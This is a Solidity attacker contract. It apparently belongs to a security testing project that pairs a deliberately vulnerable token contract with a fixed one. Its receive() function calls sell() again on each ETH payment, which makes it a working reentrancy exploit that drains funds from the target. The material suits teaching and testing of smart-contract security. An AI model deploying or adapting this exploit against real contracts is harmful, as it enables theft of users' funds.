// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./VulnerableScopeTwoToken.sol";
import "./FixedVulnerableScopeTwoToken.sol";

/// @title Reentrancy Attacker Contract
/// @author Oleksandr Voronkov
/// @notice This contract is designed to exploit reentrancy vulnerabilities in `VulnerableScopeTwoToken`.
/// @dev Used for security testing only. Do not deploy in production.
contract ReentrancyAttacker {
  /// @notice The target vulnerable contract to attack.
  VulnerableScopeTwoToken public target;
  FixedVulnerableScopeTwoToken public fixedTarget;

  /// @notice Total number of recursive attack calls to perform.
  uint256 public overallAttacksCount;

  /// @notice Current count of performed recursive attacks.
  uint256 public attackCount;

  /// @notice Amount of tokens to sell during each attack.
  uint256 public amountToSell;

  /// @notice Flag to control if recursive reentrancy attack should continue.
  bool public keepAttacking = true;

  /// @notice Flag to control if recursive reentrancy attack should continue.
  bool public attackFixed = false;

  /// @notice Emitted on each reentrant attack step.
  /// @param attackNumber The current number of attack performed.
  event NewAttack(uint attackNumber);

  /// @notice Constructor sets the vulnerable target contract.
  /// @param _target Address of the vulnerable contract to attack.
  constructor(address _target, address _fixedTarget) {
    target = VulnerableScopeTwoToken(_target);
    fixedTarget = FixedVulnerableScopeTwoToken(_fixedTarget);
  }

  /// @notice Calls the vulnerable `buy()` function to purchase tokens.
  /// @dev Ether sent with this call will be forwarded to the target contract.
  function buySomeTokens(bool _fixed) external payable {
    attackFixed = _fixed;
    if (!attackFixed) target.buy{ value: msg.value }();
    else fixedTarget.buy{ value: msg.value }();
  }

  /// @notice Sets the number of recursive attack attempts to perform.
  /// @param count The number of reentrant calls to make during the attack.
  function setAttacksCount(uint count) external {
    overallAttacksCount = count;
  }

  /// @notice Initiates the attack by calling `sell()` on the target.
  /// @param _amountToSell The amount of tokens to sell per reentrant step.
  function attack(uint _amountToSell, bool _fixed) external payable {
    amountToSell = _amountToSell;
    attackFixed = _fixed;
    if (!attackFixed) target.sell(amountToSell);
    else fixedTarget.sell(amountToSell);
  }

  /// @notice Called when the contract receives ETH. Triggers recursive reentrant attack if conditions are met.
  receive() external payable {
    if (keepAttacking && attackCount < overallAttacksCount) {
      attackCount++;
      emit NewAttack(attackCount);
      if (!attackFixed) target.sell(amountToSell);
      else fixedTarget.sell(amountToSell);
    }
  }
}
